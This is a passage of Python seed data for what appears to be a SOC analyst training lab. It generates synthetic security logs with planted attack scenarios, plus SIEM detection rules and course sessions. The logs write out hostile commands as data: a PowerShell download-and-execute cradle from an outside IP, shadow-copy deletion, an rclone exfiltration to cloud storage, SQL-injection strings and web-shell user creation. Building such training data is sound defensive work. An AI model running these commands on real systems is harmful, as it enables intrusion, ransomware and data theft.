    {"title": "LockdCrypt affiliates targeting finance via invoice lures", "severity": "Critical", "source": "SOCProfessionals Academy Intel", "date": "2026-06-11"},
    {"title": "Spike in SSH brute force from bulletproof hosting ranges", "severity": "High", "source": "SOCProfessionals Academy Intel", "date": "2026-06-09"},
    {"title": "Typosquatted payment domains registered in bulk", "severity": "Medium", "source": "SOCProfessionals Academy Intel", "date": "2026-06-07"},
    {"title": "Benign: new CDN ranges for productivity suite", "severity": "Low", "source": "SOCProfessionals Academy Intel", "date": "2026-06-05"},
]


def gen_logs():
    rnd = random.Random(42)
    base = now() - timedelta(days=6)
    users = ["j.morris", "a.kumar", "m.shah", "h.lee", "s.chen", "svc_patch"]
    hosts = ["FIN-WS-07", "WS-HR-03", "WS-MKT-11", "IT-SRV-02", "FS-01", "DC-01"]
    out = []

    def add(minutes, **f):
        out.append({"_time": (base + timedelta(minutes=minutes)).isoformat(), **f})
    for i in range(260):
        m = rnd.randint(0, 6 * 1440)
        k = rnd.choice(["win", "fw", "proxy", "dns", "auth"])
        u, h = rnd.choice(users), rnd.choice(hosts)
        if k == "win":
            add(m, sourcetype="wineventlog", host=h, user=u, event_id=rnd.choice([4624, 4624, 4688, 4634]), action="success", message=f"Logon/process event for {u}")
        elif k == "fw":
            add(m, sourcetype="firewall", host="FW-EDGE", src_ip=f"10.0.4.{rnd.randint(10, 60)}", dest_ip=rnd.choice(["8.8.8.8", "52.96.10.4", "140.82.112.3"]), dest_port=rnd.choice([443, 53, 80]), action="allow", message="Outbound connection")
        elif k == "proxy":
            add(m, sourcetype="proxy", host=h, user=u, url=rnd.choice(["https://www.office.com/", "https://github.com/", "https://intranet.acme-corp.local/"]), status=200, action="allow", message="Web request")
        elif k == "dns":
            add(m, sourcetype="dns", host=h, query=rnd.choice(["office.com", "github.com", "windowsupdate.com"]), action="resolved", message="DNS query")
        else:
            add(m, sourcetype="auth", host="VPN-GW-01", user=u, src_ip=f"10.0.4.{rnd.randint(10, 60)}", action="success", message=f"VPN login {u}")
    bf = 3 * 1440 + 160
    for i in range(45):
        add(bf + i * 0.1, sourcetype="wineventlog", host="VPN-GW-01", user="a.kumar", src_ip="45.155.205.12", event_id=4625, action="failure", message="An account failed to log on (0xC000006A)")
    add(bf + 5, sourcetype="wineventlog", host="VPN-GW-01", user="a.kumar", src_ip="45.155.205.12", event_id=4624, action="success", message="Logon Type 10 from external IP")
    ph = 5 * 1440 + 555
    add(ph, sourcetype="proxy", host="FIN-WS-07", user="j.morris", url="http://185.220.101.45/stage2.bin", status=200, action="allow", message="Download of binary from uncategorized site")
    for i in range(8):
        add(ph + 1 + i, sourcetype="proxy", host="FIN-WS-07", user="j.morris", url="http://cdn-update.top/gate.php", status=200, action="allow", message="POST beacon")
        add(ph + 1 + i, sourcetype="dns", host="FIN-WS-07", query="cdn-update.top", action="resolved", message="DNS query to newly registered domain")
    add(ph - 1, sourcetype="wineventlog", host="FIN-WS-07", user="j.morris", event_id=4688, action="success", message="WINWORD.EXE spawned powershell.exe -nop -w hidden -enc")
    add(ph + 47, sourcetype="wineventlog", host="FS-01", user="j.morris", event_id=4624, action="success", message="Logon Type 3 from FIN-WS-07")
    add(ph + 50, sourcetype="wineventlog", host="FS-01", user="backup_admin", event_id=4688, action="success", message="cmd.exe /c vssadmin delete shadows /all /quiet")
    add(ph + 51, sourcetype="wineventlog", host="FS-01", user="backup_admin", event_id=4688, action="success", message="C:\\ProgramData\\svch0st.exe --encrypt")
    add(ph + 52, sourcetype="firewall", host="FW-EDGE", src_ip="10.0.4.17", dest_ip="185.220.101.45", dest_port=443, action="allow", message="Large outbound transfer 1.2GB")
    lm = 5 * 1440 + 1300
    add(lm, sourcetype="wineventlog", host="DC-01", user="h.lee", event_id=4732, action="success", message="Member added to Domain Admins")
    add(lm + 9, sourcetype="wineventlog", host="DC-01", user="h.lee", event_id=7045, action="success", message="Service PSEXESVC installed")
    add(lm + 12, sourcetype="wineventlog", host="DC-01", user="h.lee", event_id=4720, action="success", message="User account support01 created")
    add(lm + 14, sourcetype="wineventlog", host="DC-01", user="h.lee", event_id=1102, action="success", message="The audit log was cleared")
    for i in range(420):
        m = rnd.randint(0, 6 * 1440)
        u, h = rnd.choice(users), rnd.choice(hosts[:4])
        k = rnd.choice(["sysmon", "azuread", "web", "fw2", "win2"])
        if k == "sysmon":
            p = rnd.choice([("chrome.exe", "explorer.exe"), ("outlook.exe", "explorer.exe"), ("teams.exe", "explorer.exe"), ("svchost.exe", "services.exe"), ("powershell.exe", "ccmexec.exe")])
            add(m, sourcetype="sysmon", host=h, user=u, event_id=1, process=p[0], parent_process=p[1], command_line=f"C:\\Program Files\\{p[0]}", action="success", message="Process create")
        elif k == "azuread":
            add(m, sourcetype="azuread", host="ENTRA-ID", user=f"{u}@acme-corp.com", src_ip=f"49.36.{rnd.randint(1, 50)}.{rnd.randint(2, 250)}", country="IN", app=rnd.choice(["Outlook", "Teams", "SharePoint"]), action="success", message="Sign-in success")
        elif k == "web":
            add(m, sourcetype="web", host="WEB-01", src_ip=f"{rnd.randint(11, 220)}.{rnd.randint(0, 255)}.{rnd.randint(0, 255)}.{rnd.randint(1, 254)}", method="GET", uri=rnd.choice(["/", "/products.aspx", "/login.aspx", "/css/site.css"]), status=rnd.choice([200, 200, 200, 304, 404]), user_agent="Mozilla/5.0", action="allow", message="HTTP request")
        elif k == "fw2":
            add(m, sourcetype="firewall", host="FW-EDGE", src_ip=f"10.0.4.{rnd.randint(10, 60)}", dest_ip=rnd.choice(["13.107.42.14", "142.250.183.14", "151.101.1.69"]), dest_port=443, bytes_out=rnd.randint(2000, 900000), action="allow", message="Outbound connection")
        else:
            add(m, sourcetype="wineventlog", host=h, user=u, event_id=rnd.choice([4624, 4634, 4672]), logon_type=rnd.choice([2, 3, 11]), action="success", message="An account was successfully logged on")
    sp = 4 * 1440 + 70
    for i, u in enumerate(users * 5):
        add(sp + i * 0.2, sourcetype="azuread", host="ENTRA-ID", user=f"{u}@acme-corp.com", src_ip="102.89.34.11", country="NG", app="Exchange ActiveSync", result_code=50126, action="failure", message="Invalid username or password")
    add(sp + 9, sourcetype="azuread", host="ENTRA-ID", user="m.shah@acme-corp.com", src_ip="102.89.34.11", country="NG", app="Exchange ActiveSync", action="success", message="Sign-in success (legacy auth, MFA not required)")
    add(sp + 12, sourcetype="o365", host="EXCHANGE", user="m.shah@acme-corp.com", src_ip="102.89.34.11", operation="New-InboxRule", action="success", message="Inbox rule: move from *suppliers* to RSS Feeds, mark read")
    add(sp + 430, sourcetype="azuread", host="ENTRA-ID", user="m.shah@acme-corp.com", src_ip="49.36.12.8", country="IN", app="Outlook", action="success", message="Sign-in success (impossible travel from NG)")
    kr = 2 * 1440 + 134
    for i, s in enumerate(["svc_sql", "svc_backup", "svc_web", "svc_sharepoint", "svc_crm", "svc_print"]):
        add(kr + i * 0.05, sourcetype="wineventlog", host="DC-01", user="s.chen", src_ip="10.0.4.33", event_id=4769, service=s, ticket_encryption="0x17", action="success", message=f"Kerberos service ticket requested for {s} (RC4)")
    add(kr + 30, sourcetype="wineventlog", host="DC-01", user="svc_sql", src_ip="10.0.4.33", event_id=4624, logon_type=3, action="success", message="Service account logon from workstation WS-HR-03")
    add(kr + 33, sourcetype="sysmon", host="WS-MKT-11", user="s.chen", event_id=10, process="C:\\Users\\Public\\m.exe", target_process="lsass.exe", action="success", message="Process accessed lsass.exe (GrantedAccess 0x1010)")
    ps = 1 * 1440 + 900
    add(ps, sourcetype="sysmon", host="WS-HR-03", user="a.kumar", event_id=1, process="powershell.exe", parent_process="winword.exe", command_line="powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://45.95.169.22/a.ps1')", action="success", message="Office spawned PowerShell download cradle")
    add(ps + 0.5, sourcetype="wineventlog", host="WS-HR-03", user="a.kumar", event_id=4104, script_block="IEX (New-Object Net.WebClient).DownloadString('http://45.95.169.22/a.ps1')", action="success", message="PowerShell script block logged")
    add(ps + 1, sourcetype="firewall", host="FW-EDGE", src_ip="10.0.4.29", dest_ip="45.95.169.22", dest_port=80, bytes_out=3100, action="allow", message="Outbound HTTP to rare IP")
    dt = 3 * 1440 + 1320
    for i in range(60):
        add(dt + i * 0.3, sourcetype="dns", host="IT-SRV-02", src_ip="10.0.0.12", query=f"a2RieC1jaHVuay0w{i:04d}.{i:04d}.exfil-tunnel.xyz", record_type="TXT", action="resolved", message="DNS TXT query long subdomain")
    wb = 4 * 1440 + 780
    for i, (meth, uri, q, st, ua) in enumerate([("GET", "/products.aspx", "id=7", 200, "sqlmap/1.8#stable"), ("GET", "/products.aspx", "id=7' UNION SELECT NULL,username,password FROM users--", 200, "sqlmap/1.8#stable"),
                                               ("GET", "/products.aspx", "id=7' OR 1=1--", 500, "sqlmap/1.8#stable"), ("POST", "/admin/upload.aspx", "", 200, "Mozilla/5.0"),
                                               ("GET", "/uploads/help.aspx", "cmd=whoami", 200, "Mozilla/5.0"), ("GET", "/uploads/help.aspx", "cmd=net user iis_svc2 Pa55! /add", 200, "Mozilla/5.0")]):
        add(wb + i * 1.5, sourcetype="web", host="WEB-01", src_ip="193.32.162.77", method=meth, uri=uri, uri_query=q, status=st, user_agent=ua, action="allow", message="HTTP request")
    add(wb + 7, sourcetype="sysmon", host="WEB-01", user="iis apppool\\portal", event_id=1, process="cmd.exe", parent_process="w3wp.exe", command_line="cmd.exe /c whoami", action="success", message="Web server spawned shell")
    ex = 5 * 1440 + 1380
    add(ex, sourcetype="sysmon", host="FS-01", user="backup_admin", event_id=1, process="rclone.exe", parent_process="cmd.exe", command_line="rclone.exe copy \\\\FS-01\\finance mega:dump --config rc.conf", action="success", message="Exfil tool execution")
    add(ex + 20, sourcetype="firewall", host="FW-EDGE", src_ip="10.0.0.21", dest_ip="31.216.148.12", dest_port=443, bytes_out=2150000000, action="allow", message="Large outbound transfer to mega.nz")
    for i, e in enumerate(sorted(out, key=lambda x: x["_time"])):
        e["id"] = f"evt-{i:04d}"
    return sorted(out, key=lambda x: x["_time"])


SIEM_ALERTS = [
    {"id": "al-1", "name": "Brute force > 20 failures / 5m", "query": "event_id=4625", "threshold": 20, "severity": "High"},
    {"id": "al-2", "name": "Shadow copy deletion", "query": "vssadmin", "threshold": 1, "severity": "Critical"},
    {"id": "al-3", "name": "Audit log cleared", "query": "event_id=1102", "threshold": 1, "severity": "High"},
    {"id": "al-4", "name": "Beacon to newly registered domain", "query": "sourcetype=dns query=cdn-update.top", "threshold": 3, "severity": "Medium"},
    {"id": "al-5", "name": "Password spray against Entra ID", "query": "sourcetype=azuread result_code=50126", "threshold": 20, "severity": "High"},
    {"id": "al-6", "name": "Kerberoasting (RC4 service tickets)", "query": "event_id=4769 ticket_encryption=0x17", "threshold": 5, "severity": "High"},
    {"id": "al-7", "name": "Web server spawning shell", "query": "parent_process=w3wp.exe", "threshold": 1, "severity": "Critical"},
    {"id": "al-8", "name": "DNS tunneling (TXT to one domain)", "query": "record_type=TXT query=*exfil-tunnel.xyz", "threshold": 30, "severity": "High"},
]


def sessions_seed():
    n = now()
    return [
        {"id": "ls-1", "title": "Live Triage: Phishing Queue Walkthrough", "instructor": "Riya Sen", "description": "Work a real-looking phishing queue together.", "start": (n + timedelta(days=2, hours=3)).isoformat(), "duration_min": 60, "join_link": "https://meet.example.com/socpro-phish", "capacity": 100, "recording_url": ""},
        {"id": "ls-2", "title": "Threat Hunting with Hypotheses", "instructor": "Marcus Vale", "description": "Build and run three hunts in the SIEM lab.", "start": (n + timedelta(days=6)).isoformat(), "duration_min": 90, "join_link": "https://meet.example.com/socpro-hunt", "capacity": 50, "recording_url": ""},
        {"id": "ls-3", "title": "Mock SOC Interview Night", "instructor": "Riya Sen", "description": "Rapid-fire interview questions and feedback.", "start": (n + timedelta(days=12)).isoformat(), "duration_min": 60, "join_link": "https://meet.example.com/socpro-interview", "capacity": 30, "recording_url": ""},
        {"id": "ls-0", "title": "Windows Event Logs Deep Dive", "instructor": "Marcus Vale", "description": "Recorded: the 15 event IDs that matter most.", "start": (n - timedelta(days=5)).isoformat(), "duration_min": 75, "join_link": "https://meet.example.com/socpro-winlogs", "capacity": 100, "recording_url": YT},
    ]
